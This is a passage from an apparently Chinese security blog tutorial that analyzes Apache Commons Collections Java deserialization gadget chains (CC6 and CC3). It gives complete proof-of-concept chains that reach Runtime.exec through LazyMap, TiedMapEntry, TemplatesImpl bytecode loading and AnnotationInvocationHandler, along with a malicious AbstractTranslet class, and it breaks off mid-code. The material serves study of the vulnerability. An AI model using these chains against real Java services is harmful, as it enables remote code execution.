<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 前面将lazyMap中的一个值换为一个无用的值</span></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="comment">// 这里通过反射来修改回来</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br></pre></td></tr></table></figure>

<p>但是实际情况还是无法执行，我们跟进去看一下</p>
<p>这里实际上说，如果在map中没有这个key的话，就把他put进去，实际上确实是没有这个key的，所以它也确实put了一个东西进去</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态调试跟到这里</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里我们可以简单跟一下，在最后的LazyMap.get中put了一个键值对，这个key就是我们在构造<code>TiedMapEntry</code>时所传入的key</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CC6.java</span></span><br><span class="line">map2.put(entry, <span class="string">&quot;qwe&quot;</span>);</span><br><span class="line"><span class="comment">// HashMap.put</span></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// HashMap.hash</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// LazyMap.get</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里也很简单，只需要把put进去lazyMap的remove掉不就好了吗（最终poc如下）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object,Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map2.put(entry, <span class="string">&quot;qwe&quot;</span>);</span><br><span class="line">    lazyMap.remove(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">    factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    serialize(map2);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734701609200-25c4e7fb-0063-4c31-8bdc-e7bfb47e6321.png"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>CC3链</title>
    <url>/2025/02/25/CC3%E9%93%BE/</url>
    <content><![CDATA[<h1 id="DdkQJ">CC3</h1>
CC3这条链子和前面的两条链有些不同，在这条链子中我们使用了**动态类加载**替换掉了`Runtime.exec`，由**命令执行**换为了**代码执行**

<h2 id="s50Sm">类加载</h2>
**我们来回顾一下动态类加载：**

<p>ClassLoader中的<code>loadclass</code>调用<code>findClass</code>，<code>findCLass</code>调用<code>defineClass</code></p>
<ul>
<li><code>loadClass</code> 作用是从已加载的类、父加载器位置寻找类（双亲委派机制），当前面没有找到的时候，调用 <code>findClass</code> 方法</li>
<li>findClass 根据名称或位置来加载类的字节码，其中会调用 <code>defineClass</code></li>
<li><code>dinfineClass</code>作用是处理前面传入的字节码，将其处理成真正的Java类</li>
</ul>
<p>由此我们可以知道，核心部分为defineClass</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740447451341-bad9bc59-2383-4207-ac11-578c6e98ae3f.png"></p>
<p><strong>tips：这里的defineClass需要我们多寻找几种参数类型的，因为有些参数类型的方法在外部并没有被调用</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">return</span> loadClass(name, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">            ......</span><br><span class="line">                <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                    c = findClass(name);</span><br><span class="line"></span><br><span class="line">                    ......</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// findClass 方法的源代码</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后findclass会调用defineClass</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">        <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(name, b, off, len, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="txO1d">CC3攻击链分析</h2>
<h3 id="EoyIp">调用defineClass</h3>
`defineClass`只进行类的加载，而只加类加载是不会执行代码的，所以我们需要找到一个实例化的地方

<p>我们需要找到作用域为public的类，方便我们利用。最后在<strong>TemplatesImpl</strong>中的defineClass找到了调用ClassLoader中的defineClass方法</p>
<p>由于这个类前面并没有标明作用域，所以为default，只有自己的包中可以调用</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734751868373-b97b78e0-031b-450c-a81c-1185020a9beb.png"></p>
<p>find usages后，找到了<strong>defineTransletClasses</strong>调用了该方法，但该方法仍然是private方法，我们需要找到public调用的地方</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">            ......</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                ......</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>实际上我们找到了三个地方,但具体是否可以让我们利用还得进一步看</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734752562295-ad1a8fcd-b223-4f27-a5a8-7fe4f44a35e0.png"></p>
<ol>
<li>getTransletClasses</li>
</ol>
<p>这里只是把_class原封不动返回并无利用处</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">synchronized</span> Class[] getTransletClasses() &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="comment">// Falls through</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _class;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>getTransletIndex</li>
</ol>
<p>这里是把他的下标返回了回来，也无利用处</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getTransletIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="comment">// Falls through</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _transletIndex;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>getTransletInstance</li>
</ol>
<p>这个方法初始化了我们传入的加载的类，并且将我们这个类返回，我们可以来执行任意代码了</p>
<p>但仍然是一个private方法，继续回找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">            translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="W0G6g">调用getTransletInstance</h3>
这里我们只找到了一个方法，幸运的是这个是一个public方法

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734753034929-35de887b-22ad-4291-9abb-fea8c9c18a59.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">            .......</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>现在只需要一个东西去调用newTransformer的newTransoformer方法即可执行恶意代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734753334724-21ae2363-1555-4f65-b4f3-21eb34a99f73.png"></p>
<p>这简单的两句代码，已经把执行的逻辑走完了，但是内部肯定有一些东西我们需要修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="NAk38">后续调整</h3>
进入到newTransformer，这里是不需要任何赋值，就可以走到getTransletInstance的，我们继续往里走

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734754386734-6b0ac1c8-a248-4cec-9c0f-4669636c0763.png"></p>
<p>这里若_name为空则会return所以_name我们需要赋值</p>
<p>我们想要走到definTransletClasses，则需要_class为空，则_class不需要赋值</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734754477624-f1e45b61-8ac7-4d63-801a-c71162e53fef.png"></p>
<p>这个类的无参构造什么都没有做，但它继承了Serializable接口，我们可以利用发射来修改他的值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TemplatesImpl</span><span class="params">()</span> &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title class_">Templates</span>, Serializable</span><br></pre></td></tr></table></figure>

<p>继续走入defineTransletClasses方法，如果_bytecodes为空的话，则会抛出异常，因此我们需要给它赋值</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734754888855-72c5af72-ecfe-406b-a40a-aa616c0c5794.png"></p>
<p>下面的_tfactory是需要调用方法的，防止爆空指针错误，导致无法继续执行后面代码，所以我们也需要给他赋值</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734755002019-bf7e3c20-f577-45a2-8a9f-8c28031ef833.png"></p>
<p>现在有三个变量是我们需要去赋值的<code>_name``_bytecodes``_tfactory</code></p>
<p>_name这个变量可以随便赋一个字符串类型的值，这里就不过多赘述</p>
<p>接下来我们看看这个_bytecodes是什么类型的<code>private byte[][] _bytecodes = null;</code>他是一个二维数组</p>
<p>我们看一下<code>defineClass</code>的逻辑，它接收了一个一维数组，我们看看谁调用了它</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现在<code>defineTransletClasses</code>方法中调用了它，实际上这里是一个for循环，把二维数组中的每一个数组都遍历出来，我们只需要将一维数组套用到另一个数组内，变成二维数组传入就好</p>
<p>这里的一维数组就是我们传入的字节码对象，<code>defineClass</code>会将他处理成Java类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734755419509-7f74e592-b11e-46bd-8c13-de73763bafa2.png"></p>
<p>最后还有一个_tfactory，它标识了transient，说明在序列化和反序列化时是不会传入的，但是在readObject中会初始化它</p>
<p>我们正着来测试一下它，所以在序列化阶段我们先给他赋值，它是一个<code>TransformerFactoryImpl</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">_tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br></pre></td></tr></table></figure>

<p>具体代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//为_name赋值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//为_bytecodes赋值</span></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//可有可无</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>但是这里爆了一个空指针错误，我们跟着看一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734757875148-3fcbebbe-2d8d-4c51-97f9-12713f543f73.png"></p>
<p>报错是由<code>defineTransletClasses</code>这个方法的下列部分引起的，如果我们传入字节码对象的父类不为ABSTRACT_TRANSLET，就会走到else部分中，我们上面说过<code>_class</code>是不赋值的，因此我们这里让<strong>执行类</strong>的父类变成ABSTRACT_TRANSLET，上面有标注这个常量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ABSTRACT_TRANSLET</span></span><br><span class="line">    <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>使Test继承AbstractTranslet类，并实现他的抽象方法，修改好后编译</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后也是成功弹出了计算器</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734759087945-e38bc780-79fc-475a-91fe-65d02d013e1e.png"></p>
<h3 id="s2UMe">调用newTransformer</h3>
现在我们只需要用cc1后半段的代码，来执行`newTransformer`方法即可

<p>这里<code>ConstantTransformer</code>传入templates</p>
<p>用<code>InvokerTransformer</code>去动态调用templates的<code>newTransformer</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">chainedTransformer.transform(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734759533448-dc7c6617-334e-44d2-a7fe-df931133f673.png"></p>
<p>最后把cc1的后半部分直接拿过来即可使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationhdlConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationhdlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationhdlConstructor.newInstance(Override.class,     mapProxy);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span 